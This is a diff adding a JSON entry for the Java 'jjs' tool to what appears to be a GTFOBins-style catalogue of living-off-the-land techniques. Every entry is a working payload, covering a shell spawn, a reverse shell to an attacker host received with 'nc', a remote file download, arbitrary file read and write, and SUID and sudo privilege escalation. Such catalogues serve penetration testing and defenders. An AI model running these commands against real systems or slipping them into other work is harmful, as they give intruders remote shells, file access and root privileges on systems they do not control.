@@ -1,0 +1,43 @@
+{
+  "description": "This tool is installed starting with Java SE 8.",
+  "functions": {
+    "shell": [
+      {
+        "code": "echo \"Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \\$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)').waitFor()\" | jjs"
+      }
+    ],
+    "reverse-shell": [
+      {
+        "description": "Run 'nc -l -p [port]' on the attacker box to receive the shell.",
+        "code": "echo 'var ProcessBuilder = Java.type(\"java.lang.ProcessBuilder\");\nvar p=new ProcessBuilder(\"/bin/bash\", \"-i\").redirectErrorStream(true).start();\nvar Socket = Java.type(\"java.net.Socket\");\nvar s=new Socket(\"[host]\",[port]);\nvar pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();\nvar po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){ while(pi.available()>0)so.write(pi.read()); while(pe.available()>0)so.write(pe.read()); while(si.available()>0)po.write(si.read()); so.flush();po.flush(); Java.type(\"java.lang.Thread\").sleep(50); try {p.exitValue();break;}catch (e){}};p.destroy();s.close();' | jjs\n"
+      }
+    ],
+    "file-download": [
+      {
+        "description": "Fetch a remote file via HTTP GET request.",
+        "code": "echo \"var URL = Java.type('java.net.URL');\nvar ws = new URL('[url]');\nvar Channels = Java.type('java.nio.channels.Channels');\nvar rbc = Channels.newChannel(ws.openStream());\nvar FileOutputStream = Java.type('java.io.FileOutputStream');\nvar fos = new FileOutputStream('[file]');\nfos.getChannel().transferFrom(rbc, 0, Number.MAX_VALUE);\nfos.close();\nrbc.close();\" | jjs\n"
+      }
+    ],
+    "file-write": [
+      {
+        "code": "echo 'var FileWriter = Java.type(\"java.io.FileWriter\");\nvar fw=new FileWriter(\"[file]\");\nfw.write(\"DATA\");\nfw.close();' | jjs\n"
+      }
+    ],
+    "file-read": [
+      {
+        "code": "echo 'var BufferedReader = Java.type(\"java.io.BufferedReader\");\nvar FileReader = Java.type(\"java.io.FileReader\");\nvar br = new BufferedReader(new FileReader(\"[file]\"));\nwhile ((line = br.readLine()) != null) { print(line); }' | jjs\n"
+      }
+    ],
+    "suid": [
+      {
+        "description": "This has been found working in macOS but failing on Linux systems.",
+        "code": "echo \"Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc \\$@|sh\\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)').waitFor()\" | ./jjs"
+      }
+    ],
+    "sudo": [
+      {
+        "code": "echo \"Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \\$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)').waitFor()\" | sudo jjs"
+      }
+    ]
+  }
+}
